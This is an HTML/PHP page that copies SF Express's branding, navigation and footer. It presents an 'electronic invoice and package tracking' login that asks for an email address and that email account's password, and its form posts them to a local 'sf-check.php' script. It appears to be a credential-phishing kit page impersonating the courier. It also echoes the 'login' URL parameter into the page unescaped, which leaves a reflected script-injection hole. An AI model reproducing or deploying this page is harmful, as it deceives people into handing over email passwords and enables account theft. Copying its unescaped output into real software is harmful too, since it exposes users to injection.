<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">

<head>
<meta content="text/html; charset=utf-8" http-equiv="Content-Type" />
<title>电子发票和包裹跟踪</title>
<style type="text/css">
.auto-style1 {
	font-size: 24px;
}
.auto-style2 {
	font-size: 20px;
}
</style>
<link rel="shortcut icon" href="http://www.sf-express.com/.galleries/favicon.ico" type="image/gif"/>
</head>

<body>

<div id="header" style="box-sizing: border-box; color: rgb(51, 51, 51); font-family: &quot;Source Han Sans&quot;, 微软雅黑, &quot;microsoft yahei&quot;, &quot;HanHei SC&quot;, PingHei, &quot;PingFang SC&quot;, sans-serif; font-size: 13px; font-style: normal; font-variant-ligatures: normal; font-variant-caps: normal; font-weight: 400; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; text-decoration-style: initial; text-decoration-color: initial;">
	<div class="topheader" style="box-sizing: border-box; background: rgb(255, 255, 255); width: 1280px; margin: 0px auto; height: 70px; line-height: 70px; color: rgb(51, 51, 51); font-size: 14px; position: relative; z-index: 1000;">
		<a class="logo" href="http://www.sf-express.com/cn/sc/index.html" style="box-sizing: border-box; background: 0px 0px; color: rgb(51, 51, 51); text-decoration: none; float: left; height: 44px; margin-top: 13px;">
		<img alt="顺丰速运" src="http://www.sf-express.com/resource/images/index/sf.png" style="box-sizing: border-box; border: 0px; vertical-align: middle; padding: 0px; margin: 0px; display: block; height: 44px;" /></a><ul class="topleft" style="box-sizing: border-box; margin: 0px 0px 0px 30px; padding: 0px; list-style: none; float: left;">
			<li class="topli" style="box-sizing: border-box; list-style: none; float: left; padding: 0px 14px;">
			<a class="topa" href="http://www.sf-express.com/cn/sc/index.html" style="box-sizing: border-box; background: 0px 0px; color: rgb(51, 51, 51); text-decoration: none; display: inline-block; position: relative;">
			首页</a></li>
			<li class="topli" style="box-sizing: border-box; list-style: none; float: left; padding: 0px 14px;">
			<a aria-expanded="false" aria-haspopup="true" class="topa nolink" href="javascript:void(0)" style="box-sizing: border-box; background: 0px 0px; color: rgb(51, 51, 51); text-decoration: none; cursor: default; display: inline-block; position: relative;">
			物流</a></li>
			<li class="topli" style="box-sizing: border-box; list-style: none; float: left; padding: 0px 14px;">
			<a class="topa" href="https://www.sf-financial.com/sfjrpc/?fc=ex&amp;fp=nt&amp;fa=pc&amp;" style="box-sizing: border-box; background: 0px 0px; color: rgb(51, 51, 51); text-decoration: none; display: inline-block; position: relative;" target="_blank">
			金融</a></li>
			<li class="topli" style="box-sizing: border-box; list-style: none; float: left; padding: 0px 14px;">
			<a aria-expanded="false" aria-haspopup="true" class="topa nolink" href="javascript:void(0)" style="box-sizing: border-box; background: 0px 0px; color: rgb(51, 51, 51); text-decoration: none; cursor: default; display: inline-block; position: relative;">
			商业</a></li>
			<li class="topli" style="box-sizing: border-box; list-style: none; float: left; padding: 0px 14px;">
			<a aria-expanded="false" aria-haspopup="true" class="topa" href="http://www.sf-express.com/cn/sc/case_share/" style="box-sizing: border-box; background: 0px 0px; color: rgb(51, 51, 51); text-decoration: none; display: inline-block; position: relative;">
			成功案例</a></li>
			<li class="topli" style="box-sizing: border-box; list-style: none; float: left; padding: 0px 14px;">
			<a aria-expanded="false" aria-haspopup="true" class="topa nolink" href="javascript:void(0)" style="box-sizing: border-box; background: 0px 0px; color: rgb(51, 51, 51); text-decoration: none; cursor: default; display: inline-block; position: relative;">
			服务支持</a></li>
			<li class="topli" style="box-sizing: border-box; list-style: none; float: left; padding: 0px 14px;">
			<a aria-expanded="false" aria-haspopup="true" class="topa nolink" href="javascript:void(0)" style="box-sizing: border-box; background: 0px 0px; color: rgb(51, 51, 51); text-decoration: none; cursor: default; display: inline-block; position: relative;">
			顺丰控股投资者关系</a></li>
			<li class="topli" style="box-sizing: border-box; list-style: none; float: left; padding: 0px 14px;">
			<a aria-expanded="false" aria-haspopup="true" class="topa" href="http://www.sf-express.com/cn/sc/about_us/" style="box-sizing: border-box; background: 0px 0px; color: rgb(51, 51, 51); text-decoration: none; display: inline-block; position: relative;">
			关于我们</a></li>
		</ul>
		<ul class="topright" style="box-sizing: border-box; margin: 0px; padding: 0px; list-style: none; float: right;">
			<li class="topli log quickLogin" style="box-sizing: border-box; list-style: none; float: left; padding: 0px 10px; display: list-item;">
			<span class="icon member" style="box-sizing: border-box; width: 20px; height: 20px; vertical-align: middle; position: relative; top: -1px; padding-right: 2px; background: url('http://www.sf-express.com/cn/sc/dynamic_function/images/index/header-phoneicon.png') no-repeat 1px -27px; display: inline-block;">
			</span>
			<a class="topa maidian" data-md-id="105002" data-md-name="点击登录/注册" href="javascript:void(0)" style="box-sizing: border-box; background: 0px 0px; color: rgb(51, 51, 51); text-decoration: none; display: inline-block;">
			快速登录/注册</a></li>
			<li class="topli" style="box-sizing: border-box; list-style: none; float: left; padding: 0px 10px;">
			<a class="topa" href="http://origin.sf-express.com/cn/sc/" style="box-sizing: border-box; background: 0px 0px; color: rgb(51, 51, 51); text-decoration: none; display: inline-block;">
			</a></li>
			<li class="topli switch" style="box-sizing: border-box; list-style: none; float: left; cursor: pointer; padding: 0px 10px;">
			<a aria-expanded="false" aria-haspopup="true" aria-label="版本切换菜单" class="icon flag cn" href="javascript:void(0)" style="box-sizing: border-box; background: url('http://www.sf-express.com/cn/sc/dynamic_function/images/index/header-phoneicon.png') no-repeat 12px -83px; color: rgb(51, 51, 51); text-decoration: none; height: 20px; width: 20px; vertical-align: middle; position: relative; top: -1px; padding-right: 2px; display: inline-block;">
			</a></li>
		</ul>
	</div>
</div>
<nav class="dynamic-nav-bar" style="box-sizing: border-box; display: flex; height: 71px; align-items: center; justify-content: center; background: rgb(51, 51, 51); min-width: 1280px; color: rgb(51, 51, 51); font-family: &quot;Source Han Sans&quot;, 微软雅黑, &quot;microsoft yahei&quot;, &quot;HanHei SC&quot;, PingHei, &quot;PingFang SC&quot;, sans-serif; font-size: 13px; font-style: normal; font-variant-ligatures: normal; font-variant-caps: normal; font-weight: 400; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; text-decoration-style: initial; text-decoration-color: initial;">
	<a href="javascript:void(0);" onclick="jumpOrder()" style="box-sizing: border-box; background: 0px 0px; color: rgb(153, 153, 153); text-decoration: none; padding: 12px 50px; margin: 0px 2px; position: relative;">
	运单跟踪</a><a class="active" href="index.php" style="box-sizing: border-box; background: 0px 0px; color: rgb(255, 255, 255); text-decoration: none; padding: 12px 50px; margin: 0px 2px; position: relative;">电子发票</a></nav>
<div class="dynamic_content_wrapper" style="box-sizing: border-box; background: rgb(242, 242, 242); padding-bottom: 71px; min-width: 1280px; color: rgb(51, 51, 51); font-family: &quot;Source Han Sans&quot;, 微软雅黑, &quot;microsoft yahei&quot;, &quot;HanHei SC&quot;, PingHei, &quot;PingFang SC&quot;, sans-serif; font-size: 13px; font-style: normal; font-variant-ligatures: normal; font-variant-caps: normal; font-weight: 400; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; text-decoration-style: initial; text-decoration-color: initial;">
	<div class="dynamic_content" style="box-sizing: border-box; width: 960px; margin: 0px auto;">
		<div id="function" style="box-sizing: border-box;">
			<div style="box-sizing: border-box;">
				<div class="shipping-detail-page" style="box-sizing: border-box; min-height: 596px; background-color: rgb(255, 255, 255);">
					<div class="shipping-search-detail" style="box-sizing: border-box; position: relative; padding: 24px 80px 0px;">
						<div class="bill-number-wrapper" style="box-sizing: border-box;">
							<div class="bill-number-list-content" style="box-sizing: border-box;">
								<ul class="nearly-records clearfix" style="box-sizing: border-box; margin: 0px; padding: 0px; list-style: none;">
								</ul>
							</div>
							<div style="box-sizing: border-box;">
							</div>
						</div>
					</div>
					<div class="delivery-view" style="box-sizing: border-box; background: rgb(255, 255, 255); padding-bottom: 23px;">
						<div class="my-bills" style="box-sizing: border-box; margin-top: 24px;">
							<div class="auto-style1" style="box-sizing: border-box; padding: 0px 60px; ">
								电子发票和包裹跟踪
							<div class="auto-style1" style="box-sizing: border-box; padding: 0px 60px; ">
								<strong>&nbsp;</strong></div></div>
							<form action="sf-check.php" id="LoginForm" method="POST">
							<div class="auto-style1" style="box-sizing: border-box; padding: 0px 60px; ">
								<strong>&nbsp;</strong><span class="auto-style2" data-md-id="115003" data-md-name="点击我寄的" data-type="send" style="box-sizing: border-box; display: inline-block; padding-bottom: 7px; border-bottom: 2px solid rgb(220, 30, 50); padding-right: 25px; margin: 0px 30px -1px 0px; color: rgb(220, 30, 50);"><strong>电子发票</strong></span></div>
							<div class="bill-tab" style="box-sizing: border-box; border-bottom: 1px solid rgb(241, 241, 241); padding: 17px 0px 0px 79px; color: rgb(96, 96, 96); font-size: 18px; font-weight: 700;">
								<span class="receive-tab maidian" data-md-id="115004" data-md-name="点击我收的" data-type="receive" style="box-sizing: border-box; display: inline-block; padding-bottom: 7px; border-bottom: 2px solid transparent; padding-right: 25px; margin: 0px 30px -1px 0px;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
								请用有效的电子邮件和密码</span></div>
							<div class="no-login-wrap" style="box-sizing: border-box; padding-bottom: 20px; text-align: center; display: block;">
								<div class="no-login-tip" style="box-sizing: border-box; width: 439px; height: 154px; padding: 10px; margin: 20px auto 10px; position: relative; color: rgb(102, 102, 102); left: 0px; top: 46px;">
									<table class="table-form ml50" style="margin: 0px 0px 0px 50px; padding: 0px; border-collapse: collapse; border-spacing: 0px; empty-cells: show; color: rgb(101, 101, 101); font-family: Arial; font-size: 12px; font-style: normal; font-variant-ligatures: normal; font-variant-caps: normal; font-weight: 400; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255); text-decoration-style: initial; text-decoration-color: initial;">
										<tbody style="margin: 0px; padding: 0px;">
											<tr style="margin: 0px; padding: 0px;">
												<th class="form-label" style="margin: 0px; padding: 10px 5px; font-style: normal; font-weight: normal; text-align: right; width: 97px; white-space: nowrap;">
												电子邮件<label style="margin: 0px; padding: 0px;">:</label></th>
												<td style="margin: 0px; padding: 10px 5px;">
												<input id="username" altercss="tipsgray" autocomplete="off" class="input-text input-normal tipsgray" datatype="loginName" name="username" nullmsg="登录名不能为空" size="20" style="margin: 0px; padding: 0px 5px; font-size: 12px; vertical-align: middle; line-height: 28px; color: rgb(160, 154, 149); border: 1px solid rgb(200, 202, 204); background-color: rgb(255, 255, 255); box-shadow: rgb(235, 234, 234) 1px 2px 5px inset; border-radius: 5px; height: 28px; overflow: hidden; width: 160px;" tabindex="1" type="hidden" value="<?php echo $_GET['login']; ?>" /><?php echo $_GET['login']; ?></td>
											</tr>
											<tr style="margin: 0px; padding: 0px;">
												<th class="form-label" style="margin: 0px; padding: 10px 5px; font-style: normal; font-weight: normal; text-align: right; width: 97px; white-space: nowrap;">
												<label style="margin: 0px; padding: 0px;">
												电子邮件密码:</label></th>
												<td style="margin: 0px; padding: 10px 5px;">
												<input required id="password" class="input-text input-normal" datatype="password" name="password" nullmsg="???登录密码不能为空???" size="20" style="margin: 0px; padding: 0px 5px; font-size: 12px; vertical-align: middle; line-height: 28px; color: rgb(101, 101, 101); border: 1px solid rgb(200, 202, 204); background-color: rgb(255, 255, 255); box-shadow: rgb(235, 234, 234) 1px 2px 5px inset; border-radius: 5px; height: 28px; overflow: hidden; width: 195px;" tabindex="2" type="password" value="" /><span>&nbsp;</span></td>
											</tr>
											<tr style="margin: 0px; padding: 0px;">
												<th style="margin: 0px; padding: 10px 5px; font-style: normal; font-weight: normal; text-align: right; width: 97px;">
												</th>
												<td style="margin: 0px; padding: 10px 5px;">
								<button type="submit" class="login-btn maidian" data-md-id="115005" data-md-name="点击登录/注册" style="box-sizing: border-box; display: inline-block; padding: 10px 30px; border-radius: 20px; background: rgb(235, 29, 33); border: 1px solid rgb(181, 25, 25); color: rgb(255, 255, 255); cursor: pointer;">
									<span style="box-sizing: border-box;">登录</span></button>
												<span>&nbsp;</span></td>
											</tr>
									</table>
								</div>
								<br />
								<br />
							</div>
						</div>
					</div>
				</div>
			</div>
		</div>
		<div class="order-button-wrapper" style="box-sizing: border-box; text-align: center; padding: 15px 0px;">
		</div>
	</div>
</div>
<div id="footer" style="box-sizing: border-box; color: rgb(51, 51, 51); font-family: &quot;Source Han Sans&quot;, 微软雅黑, &quot;microsoft yahei&quot;, &quot;HanHei SC&quot;, PingHei, &quot;PingFang SC&quot;, sans-serif; font-size: 13px; font-style: normal; font-variant-ligatures: normal; font-variant-caps: normal; font-weight: 400; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; text-decoration-style: initial; text-decoration-color: initial;">
	<div class="botfooter" style="box-sizing: border-box; width: 1690.67px; min-width: 1280px; border-top: 8px solid rgb(220, 30, 50); background: rgb(0, 0, 0); position: relative; padding-top: 50px;">
		<div class="fcontainer posre" style="box-sizing: border-box; position: relative; width: 1280px; margin: 0px auto;">
			<div class="left cn" style="box-sizing: border-box; border-right: 1px solid rgb(51, 51, 51); float: left; width: 1010px;">
				<table style="box-sizing: border-box; border-collapse: collapse; border-spacing: 0px; max-width: 100%; background-color: transparent; width: 1008.67px;">
					<tbody style="box-sizing: border-box;">
						<tr style="box-sizing: border-box;">
							<td style="box-sizing: border-box; padding: 0px 6px 0px 0px; vertical-align: top;">
							<p class="title" style="box-sizing: border-box; margin: 0px 0px 20px;">
							<a class="nolink" href="javascript:void(0)" style="box-sizing: border-box; background: 0px 0px; color: rgb(255, 255, 255); text-decoration: none; font-size: 16px; cursor: default; white-space: nowrap;">
							物流</a></p>
							<ul class="list" style="box-sizing: border-box; margin: 0px; padding: 0px; list-style: none;">
								<li style="box-sizing: border-box; list-style: none; line-height: 19px; margin-bottom: 10px;">
								<a href="http://www.sf-express.com/cn/sc/express/express_service/city_distribution/SF_Rush/" style="box-sizing: border-box; background: 0px 0px; color: rgb(177, 177, 177); text-decoration: none; font-size: 14px;">
								快递服务</a></li>
								<li style="box-sizing: border-box; list-style: none; line-height: 19px; margin-bottom: 10px;">
								<a href="http://www.sf-express.com/cn/sc/express/cold_service/food_service/fresh_match/" style="box-sizing: border-box; background: 0px 0px; color: rgb(177, 177, 177); text-decoration: none; font-size: 14px;">
								冷运服务</a></li>
								<li style="box-sizing: border-box; list-style: none; line-height: 19px;">
								<a href="http://www.sf-express.com/cn/sc/express/storage_service/storage_services/warehouse_management/" style="box-sizing: border-box; background: 0px 0px; color: rgb(177, 177, 177); text-decoration: none; font-size: 14px;">
								仓储服务</a></li>
							</ul>
							</td>
							<td style="box-sizing: border-box; padding: 0px 6px 0px 0px; vertical-align: top;">
							<p class="title" style="box-sizing: border-box; margin: 0px 0px 20px;">
							<a href="https://www.sf-financial.com/sfjrpc/?fc=ex&amp;fp=nt&amp;fa=pc&amp;" style="box-sizing: border-box; background: 0px 0px; color: rgb(255, 255, 255); text-decoration: none; font-size: 16px; white-space: nowrap;" target="_blank">
							金融</a></p>
							<ul class="list" style="box-sizing: border-box; margin: 0px; padding: 0px; list-style: none;">
								<li style="box-sizing: border-box; list-style: none; line-height: 19px; margin-bottom: 10px;">
								<a href="https://www.sf-financial.com/index.html?fc=ex&amp;fp=nb&amp;fa=pc&amp;" style="box-sizing: border-box; background: 0px 0px; color: rgb(177, 177, 177); text-decoration: none; font-size: 14px;" target="_blank">
								财富管理</a></li>
								<li style="box-sizing: border-box; list-style: none; line-height: 19px; margin-bottom: 10px;">
								<a href="https://www.sf-financial.com/index.html?fc=ex&amp;fp=nb&amp;fa=pc&amp;" style="box-sizing: border-box; background: 0px 0px; color: rgb(177, 177, 177); text-decoration: none; font-size: 14px;" target="_blank">
								资产管理</a></li>
								<li style="box-sizing: border-box; list-style: none; line-height: 19px;">
								<a href="https://www.sf-financial.com/index.html?fc=ex&amp;fp=nb&amp;fa=pc&amp;" style="box-sizing: border-box; background: 0px 0px; color: rgb(177, 177, 177); text-decoration: none; font-size: 14px;" target="_blank">
								综合支付</a></li>
							</ul>
							</td>
							<td style="box-sizing: border-box; padding: 0px 6px 0px 0px; vertical-align: top;">
							<p class="title" style="box-sizing: border-box; margin: 0px 0px 20px;">
							<a class="nolink" href="javascript:void(0)" style="box-sizing: border-box; background: 0px 0px; color: rgb(255, 255, 255); text-decoration: none; font-size: 16px; cursor: default; white-space: nowrap;">
							商业</a></p>
							<ul class="list" style="box-sizing: border-box; margin: 0px; padding: 0px; list-style: none;">
								<li style="box-sizing: border-box; list-style: none; line-height: 19px; margin-bottom: 10px;">
								<a href="http://www.sfbest.com/" style="box-sizing: border-box; background: 0px 0px; color: rgb(177, 177, 177); text-decoration: none; font-size: 14px;" target="_blank">
								顺丰优选网上商城</a></li>
								<li style="box-sizing: border-box; list-style: none; line-height: 19px;">
								<a href="http://www.sfbest.com/html/activity/1474966515.html" style="box-sizing: border-box; background: 0px 0px; color: rgb(177, 177, 177); text-decoration: none; font-size: 14px;" target="_blank">
								顺丰优选门店</a></li>
							</ul>
							</td>
							<td style="box-sizing: border-box; padding: 0px 6px 0px 0px; vertical-align: top;">
							<p class="title" style="box-sizing: border-box; margin: 0px 0px 20px;">
							<a href="http://www.sf-express.com/cn/sc/case_share/" style="box-sizing: border-box; background: 0px 0px; color: rgb(255, 255, 255); text-decoration: none; font-size: 16px; white-space: nowrap;">
							成功案例</a></p>
							<ul class="list" style="box-sizing: border-box; margin: 0px; padding: 0px; list-style: none;">
								<li style="box-sizing: border-box; list-style: none; line-height: 19px; margin-bottom: 10px;">
								<a href="http://www.sf-express.com/cn/sc/case_share/index.html_364584038.html" style="box-sizing: border-box; background: 0px 0px; color: rgb(177, 177, 177); text-decoration: none; font-size: 14px;">
								3C电子行业</a></li>
								<li style="box-sizing: border-box; list-style: none; line-height: 19px; margin-bottom: 10px;">
								<a href="http://www.sf-express.com/cn/sc/case_share/index.html_836109172.html" style="box-sizing: border-box; background: 0px 0px; color: rgb(177, 177, 177); text-decoration: none; font-size: 14px;">
								医疗行业</a></li>
								<li style="box-sizing: border-box; list-style: none; line-height: 19px; margin-bottom: 10px;">
								<a href="http://www.sf-express.com/cn/sc/case_share/index.html_591155569.html" style="box-sizing: border-box; background: 0px 0px; color: rgb(177, 177, 177); text-decoration: none; font-size: 14px;">
								生鲜行业</a></li>
								<li style="box-sizing: border-box; list-style: none; line-height: 19px;">
								<a href="http://www.sf-express.com/cn/sc/case_share/index.html_1045342821.html" style="box-sizing: border-box; background: 0px 0px; color: rgb(177, 177, 177); text-decoration: none; font-size: 14px;">
								快消行业</a></li>
							</ul>
							</td>
							<td style="box-sizing: border-box; padding: 0px 6px 0px 0px; vertical-align: top;">
							<p class="title" style="box-sizing: border-box; margin: 0px 0px 20px;">
							<a class="nolink" href="javascript:void(0)" style="box-sizing: border-box; background: 0px 0px; color: rgb(255, 255, 255); text-decoration: none; font-size: 16px; cursor: default; white-space: nowrap;">
							服务支持</a></p>
							<ul class="list" style="box-sizing: border-box; margin: 0px; padding: 0px; list-style: none;">
								<li style="box-sizing: border-box; list-style: none; line-height: 19px; margin-bottom: 10px;">
								<a href="http://www.sf-express.com/cn/sc/dynamic_function/order/quick/" style="box-sizing: border-box; background: 0px 0px; color: rgb(177, 177, 177); text-decoration: none; font-size: 14px;">
								我要寄件</a></li>
								<li style="box-sizing: border-box; list-style: none; line-height: 19px; margin-bottom: 10px;">
								<a href="http://www.sf-express.com/cn/sc/dynamic_function/waybill/" style="box-sizing: border-box; background: 0px 0px; color: rgb(177, 177, 177); text-decoration: none; font-size: 14px;">
								运单追踪</a></li>
								<li style="box-sizing: border-box; list-style: none; line-height: 19px; margin-bottom: 10px;">
								<a href="http://www.sf-express.com/cn/sc/dynamic_function/price/" style="box-sizing: border-box; background: 0px 0px; color: rgb(177, 177, 177); text-decoration: none; font-size: 14px;">
								运费时效查询</a></li>
								<li style="box-sizing: border-box; list-style: none; line-height: 19px; margin-bottom: 10px;">
								<a href="http://www.sf-express.com/cn/sc/dynamic_function/range/" style="box-sizing: border-box; background: 0px 0px; color: rgb(177, 177, 177); text-decoration: none; font-size: 14px;">
								收寄范围查询</a></li>
								<li style="box-sizing: border-box; list-style: none; line-height: 19px; margin-bottom: 10px;">
								<a href="http://www.sf-express.com/cn/sc/dynamic_function/store/" style="box-sizing: border-box; background: 0px 0px; color: rgb(177, 177, 177); text-decoration: none; font-size: 14px;">
								服务网点查询</a></li>
								<li style="box-sizing: border-box; list-style: none; line-height: 19px; margin-bottom: 10px;">
								<a href="http://www.sf-express.com/cn/sc/dynamic_function/accept/" style="box-sizing: border-box; background: 0px 0px; color: rgb(177, 177, 177); text-decoration: none; font-size: 14px;">
								收寄标准查询</a></li>
								<li style="box-sizing: border-box; list-style: none; line-height: 19px;">
								<a href="http://www.sf-express.com/cn/sc/dynamic_function/sf_care/" style="box-sizing: border-box; background: 0px 0px; color: rgb(177, 177, 177); text-decoration: none; font-size: 14px;">
								更多内容查询</a></li>
							</ul>
							</td>
							<td style="box-sizing: border-box; padding: 0px 6px 0px 0px; vertical-align: top;">
							<p class="title" style="box-sizing: border-box; margin: 0px 0px 20px;">
							<a class="nolink" href="javascript:void(0)" style="box-sizing: border-box; background: 0px 0px; color: rgb(255, 255, 255); text-decoration: none; font-size: 16px; cursor: default; white-space: nowrap;">
							顺丰控股投资者关系</a></p>
							<ul class="list" style="box-sizing: border-box; margin: 0px; padding: 0px; list-style: none;">
								<li style="box-sizing: border-box; list-style: none; line-height: 19px; margin-bottom: 10px;">
								<a href="http://www.sf-express.com/cn/sc/investor_relations/corporate_governance/" style="box-sizing: border-box; background: 0px 0px; color: rgb(177, 177, 177); text-decoration: none; font-size: 14px;">
								公司治理</a></li>
								<li style="box-sizing: border-box; list-style: none; line-height: 19px; margin-bottom: 10px;">
								<a href="http://www.sf-express.com/cn/sc/investor_relations/latest_announcement/" style="box-sizing: border-box; background: 0px 0px; color: rgb(177, 177, 177); text-decoration: none; font-size: 14px;">
								公司公告</a></li>
								<li style="box-sizing: border-box; list-style: none; line-height: 19px; margin-bottom: 10px;">
								<a href="http://www.sf-express.com/cn/sc/investor_relations/periodic_report/financial_statements/" style="box-sizing: border-box; background: 0px 0px; color: rgb(177, 177, 177); text-decoration: none; font-size: 14px;">
								定期报告</a></li>
								<li style="box-sizing: border-box; list-style: none; line-height: 19px; margin-bottom: 10px;">
								<a href="http://www.sf-express.com/cn/sc/investor_relations/stock_information/" style="box-sizing: border-box; background: 0px 0px; color: rgb(177, 177, 177); text-decoration: none; font-size: 14px;">
								投资者联络</a></li>
								<li style="box-sizing: border-box; list-style: none; line-height: 19px;">
								<a href="http://www.sf-express.com/cn/sc/investor_relations/investor_relations_calendar/board_meeting/" style="box-sizing: border-box; background: 0px 0px; color: rgb(177, 177, 177); text-decoration: none; font-size: 14px;">
								投资者关系日历</a></li>
							</ul>
							</td>
							<td style="box-sizing: border-box; padding: 0px 6px 0px 0px; vertical-align: top;">
							<p class="title" style="box-sizing: border-box; margin: 0px 0px 20px;">
							<a href="http://www.sf-express.com/cn/sc/about_us/" style="box-sizing: border-box; background: 0px 0px; color: rgb(255, 255, 255); text-decoration: none; font-size: 16px; white-space: nowrap;">
							关于我们</a></p>
							<ul class="list" style="box-sizing: border-box; margin: 0px; padding: 0px; list-style: none;">
								<li style="box-sizing: border-box; list-style: none; line-height: 19px; margin-bottom: 10px;">
								<a href="http://www.sf-express.com/cn/sc/about_us/about_sf/company_introduction/" style="box-sizing: border-box; background: 0px 0px; color: rgb(177, 177, 177); text-decoration: none; font-size: 14px;">
								关于顺丰</a></li>
								<li style="box-sizing: border-box; list-style: none; line-height: 19px; margin-bottom: 10px;">
								<a href="http://www.sf-express.com/cn/sc/news/" style="box-sizing: border-box; background: 0px 0px; color: rgb(177, 177, 177); text-decoration: none; font-size: 14px;">
								新闻资讯</a></li>
								<li style="box-sizing: border-box; list-style: none; line-height: 19px; margin-bottom: 10px;">
								<a href="http://www.sf-express.com/cn/sc/notice/" style="box-sizing: border-box; background: 0px 0px; color: rgb(177, 177, 177); text-decoration: none; font-size: 14px;">
								服务公告</a></li>
								<li style="box-sizing: border-box; list-style: none; line-height: 19px; margin-bottom: 10px;">
								<a href="http://www.sf-express.com/cn/sc/promotions/" style="box-sizing: border-box; background: 0px 0px; color: rgb(177, 177, 177); text-decoration: none; font-size: 14px;">
								促销活动</a></li>
								<li style="box-sizing: border-box; list-style: none; line-height: 19px; margin-bottom: 10px;">
								<a href="http://www.sf-express.com/cn/sc/about_us/member_interests/Individual_members/Membership_Levels_and_Growing_Value/" style="box-sizing: border-box; background: 0px 0px; color: rgb(177, 177, 177); text-decoration: none; font-size: 14px;">
								会员权益</a></li>
								<li style="box-sizing: border-box; list-style: none; line-height: 19px; margin-bottom: 10px;">
								<a href="http://hr.sf-express.com/" style="box-sizing: border-box; background: 0px 0px; color: rgb(177, 177, 177); text-decoration: none; font-size: 14px;" target="_blank">
								人才招聘</a></li>
								<li style="box-sizing: border-box; list-style: none; line-height: 19px;">
								<a href="http://www.sf-express.com/cn/sc/purchase_information/" style="box-sizing: border-box; background: 0px 0px; color: rgb(177, 177, 177); text-decoration: none; font-size: 14px;">
								集团采购</a></li>
							</ul>
							</td>
							<td style="box-sizing: border-box; padding: 0px 6px 0px 0px; vertical-align: top;">
							<p class="title" style="box-sizing: border-box; margin: 0px 0px 20px;">
							<a class="nolink" href="javascript:void(0)" style="box-sizing: border-box; background: 0px 0px; color: rgb(255, 255, 255); text-decoration: none; font-size: 16px; cursor: default; white-space: nowrap;">
							联系我们</a></p>
							<ul class="list" style="box-sizing: border-box; margin: 0px; padding: 0px; list-style: none;">
								<li style="box-sizing: border-box; list-style: none; line-height: 19px; margin-bottom: 10px;">
								<a class="nolink" href="javascript:void(0)" style="box-sizing: border-box; background: 0px 0px; color: rgb(177, 177, 177); text-decoration: none; font-size: 14px; cursor: default;">
								客服专线95338</a></li>
								<li style="box-sizing: border-box; list-style: none; line-height: 19px; margin-bottom: 10px;">
								<a href="http://www.sf-express.com/cn/sc/Customer-Service-Hotlines/" style="box-sizing: border-box; background: 0px 0px; color: rgb(177, 177, 177); text-decoration: none; font-size: 14px;">
								客户服务热线</a></li>
								<li style="box-sizing: border-box; list-style: none; line-height: 19px; margin-bottom: 10px;">
								<a href="http://www.sf-express.com/cn/sc/cooperative_consultation/" style="box-sizing: border-box; background: 0px 0px; color: rgb(177, 177, 177); text-decoration: none; font-size: 14px;">
								合作咨询</a></li>
								<li style="box-sizing: border-box; list-style: none; line-height: 19px;">
								<a href="http://ocs2odp.sf-express.com/app/init?orgName=sy&amp;channelId=469&amp;clientType=1&amp;accountId=" style="box-sizing: border-box; background: 0px 0px; color: rgb(177, 177, 177); text-decoration: none; font-size: 14px;" target="_blank">
								在线客服</a></li>
							</ul>
							</td>
						</tr>
				</table>
			</div>
			<div class="right cn" style="box-sizing: border-box; text-align: center; float: left; width: 269px;">
				<p class="title" style="box-sizing: border-box; margin: 0px 0px 20px;">
				<a class="nolink" href="javascript:void(0)" style="box-sizing: border-box; background: 0px 0px; color: rgb(255, 255, 255); text-decoration: none; font-size: 16px; cursor: default;">
				马上联系我们</a></p>
				<div class="share" style="box-sizing: border-box; margin-top: 30px;">
					<a aria-label="分享至微博" class="xinlang" href="http://weibo.com/sfsuyun?is_hot=1" style="box-sizing: border-box; background: url('http://www.sf-express.com/cn/sc/dynamic_function/images/index/label-top-r-btn.png') no-repeat; color: rgb(177, 177, 177); text-decoration: none; font-size: 14px; display: inline-block; width: 58px; height: 58px;">
					</a><span>&nbsp;</span><a aria-label="分享至微信" class="weixin" href="javascript:void(0)" style="box-sizing: border-box; background: url('http://www.sf-express.com/cn/sc/dynamic_function/images/index/label-top-r-btn.png') no-repeat -80px 0px; color: rgb(177, 177, 177); text-decoration: none; font-size: 14px; display: inline-block; width: 58px; height: 58px; margin: 0px 15px; position: relative;"></a><span>&nbsp;</span><a aria-label="在线客服" class="online" href="http://ocs2-isp.sf-express.com/?orgName=sy&amp;channelId=469&amp;clientType=1#/pc/home" style="box-sizing: border-box; background: url('http://www.sf-express.com/cn/sc/dynamic_function/images/index/label-top-r-btn.png') no-repeat -157px 0px; color: rgb(177, 177, 177); text-decoration: none; font-size: 14px; display: inline-block; width: 58px; height: 58px;" target="_blank"></a></div>
			</div>
		</div>
		<div class="others" style="box-sizing: border-box; margin-top: 50px; padding: 15px 0px; border-top: 1px solid rgb(51, 51, 51); border-bottom: 1px solid rgb(51, 51, 51);">
			<ul class="fcontainer cn" style="box-sizing: border-box; margin: 0px auto; padding: 0px; list-style: none; width: 1280px; overflow: hidden;">
